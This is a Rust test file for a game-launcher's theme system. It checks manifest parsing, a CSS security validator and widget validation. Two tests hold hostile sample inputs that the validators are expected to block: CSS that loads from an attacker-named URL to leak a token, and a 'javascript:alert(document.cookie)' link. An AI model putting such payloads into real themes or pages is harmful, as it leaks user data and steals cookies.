use omnis_core::{
    parse_and_validate_theme_manifest, validate_theme_css_security, CURRENT_THEME_API_VERSION,
};
use omnis_sdk::{SlotWidget, WidgetLink};

#[test]
fn test_theme_manifest_valid_and_tokens_extraction() {
    let manifest_json = r##"{
        "id": "cinema-lounge",
        "apiVersion": 1,
        "name": "Cinema Lounge (Trailer Videos)",
        "tokens": {
            "--omnis-accent": "#e5b45a",
            "--omnis-card-radius": "18px",
            "--omnis-bg-card": "#18181f"
        },
        "styles": ["theme.css"],
        "layouts": { "library": "grid-large" }
    }"##;

    let parsed = parse_and_validate_theme_manifest(manifest_json);
    assert!(parsed.is_ok(), "Manifest should parse successfully");
    let manifest = parsed.unwrap();
    assert_eq!(manifest.id, "cinema-lounge");
    assert_eq!(manifest.api_version, CURRENT_THEME_API_VERSION);
    assert_eq!(manifest.tokens.get("--omnis-accent").unwrap(), "#e5b45a");
    assert_eq!(manifest.tokens.get("--omnis-card-radius").unwrap(), "18px");
    assert_eq!(manifest.layouts.get("library").unwrap(), "grid-large");
    assert_eq!(manifest.styles, vec!["theme.css".to_string()]);
}

#[test]
fn test_theme_manifest_unsupported_api_version_rejected() {
    let manifest_json = r##"{
        "id": "future-theme",
        "apiVersion": 2,
        "tokens": { "--omnis-accent": "#00ffcc" },
        "styles": ["future.css"]
    }"##;

    let res = parse_and_validate_theme_manifest(manifest_json);
    assert!(res.is_err(), "Unsupported apiVersion must be rejected");
    let err = res.unwrap_err();
    assert!(
        err.contains("unsupported apiVersion 2"),
        "Error message must specify unsupported apiVersion: {}",
        err
    );
    assert!(
        err.contains("Supported apiVersion is 1"),
        "Error message must specify supported version: {}",
        err
    );
}

#[test]
fn test_theme_css_security_allows_semantic_selectors_and_safe_urls() {
    let safe_css = r#"
        [data-omnis="game-card"] {
            border-radius: var(--omnis-card-radius, 14px);
            background-color: var(--omnis-bg-card);
            box-shadow: 0 0 20px var(--omnis-accent);
        }
        [data-omnis="game-card.cover"] {
            border-radius: var(--omnis-card-radius);
        }
        [data-omnis="details.hero"] {
            backdrop-filter: blur(8px);
        }
        [data-omnis-slot="details.hero"] [data-omnis-widget="progress"] {
            color: var(--omnis-accent, #f59e0b);
        }
        [data-state="running"] {
            outline: 2px solid #10b981;
        }
        .local-asset {
            background-image: url("asset://themes/cinema/pattern.png");
        }
        .data-uri {
            background-image: url('data:image/svg+xml;utf8,<svg></svg>');
        }
        .relative-url {
            background-image: url('./assets/noise.png');
        }
    "#;

    assert!(
        validate_theme_css_security(safe_css).is_ok(),
        "Safe CSS with semantic data-omnis attributes and asset: protocol must pass"
    );
}

#[test]
fn test_theme_css_security_blocks_external_url_exfiltration() {
    let evil_css_url = r#"
        [data-omnis="game-card"] {
            background-image: url("https://evil.attacker.com/leak?game=token");
        }
    "#;
    let res = validate_theme_css_security(evil_css_url);
    assert!(res.is_err(), "External https:// URL in CSS must be blocked");
    let err = res.unwrap_err();
    assert!(err.contains("external URL reference blocked"));
    assert!(err.contains("https://evil.attacker.com/leak?game=token"));

    let evil_protocol_relative = r#"
        [data-omnis="game-card.cover"] {
            background-image: url("//malicious.site/tracker.gif");
        }
    "#;
    assert!(validate_theme_css_security(evil_protocol_relative).is_err());

    let evil_import = r#"
        @import url("http://insecure-cdn.org/styles.css");
        body { margin: 0; }
    "#;
    assert!(validate_theme_css_security(evil_import).is_err());
}

#[test]
fn test_slot_widget_schema_validation_success() {
    // 1. Stat widget
    let stat = SlotWidget::Stat {
        label: "Achievements".to_string(),
        value: "34 / 50".to_string(),
        icon: Some("trophy".to_string()),
    };
    assert!(stat.validate().is_ok());

    // 2. Progress widget
    let progress = SlotWidget::Progress {
        label: "Obiettivi Sbloccati".to_string(),
        value: 34,
        max: 50,
    };
    assert!(progress.validate().is_ok());

    // 3. Badge-list widget
    let badges = SlotWidget::BadgeList {
        badges: vec![
            "Steam Deck Verified".to_string(),
            "Cloud Save".to_string(),
            "Singleplayer".to_string(),
        ],
    };
    assert!(badges.validate().is_ok());

    // 4. Link-list widget
    let links = SlotWidget::LinkList {
        links: vec![
            WidgetLink {
                title: "ProtonDB".to_string(),
                url: "https://www.protondb.com/app/1091500".to_string(),
            },
            WidgetLink {
                title: "PCGamingWiki".to_string(),
                url: "https://www.pcgamingwiki.com/wiki/Cyberpunk_2077".to_string(),
            },
        ],
    };
    assert!(links.validate().is_ok());

    // 5. Text widget
    let text = SlotWidget::Text {
        content: "Esecuzione a 60 FPS stabili con configurazione ad alta fedeltà.".to_string(),
    };
    assert!(text.validate().is_ok());
}

#[test]
fn test_slot_widget_schema_validation_rejections() {
    // Empty stat label
    let invalid_stat = SlotWidget::Stat {
        label: "   ".to_string(),
        value: "10".to_string(),
        icon: None,
    };
    assert!(invalid_stat.validate().is_err());

    // Progress with max = 0
    let invalid_progress = SlotWidget::Progress {
        label: "Download".to_string(),
        value: 0,
        max: 0,
    };
    assert!(invalid_progress.validate().is_err());

    // Prohibited javascript: link
    let evil_link = SlotWidget::LinkList {
        links: vec![WidgetLink {
            title: "Dangerous".to_string(),
            url: "javascript:alert(document.cookie)".to_string(),
        }],
    };
    assert!(evil_link.validate().is_err());

    // Empty badge text
    let invalid_badges = SlotWidget::BadgeList {
        badges: vec!["Good".to_string(), "".to_string()],
    };
    assert!(invalid_badges.validate().is_err());

    // Empty text widget
    let empty_text = SlotWidget::Text {
        content: "   ".to_string(),
    };
    assert!(empty_text.validate().is_err());
}
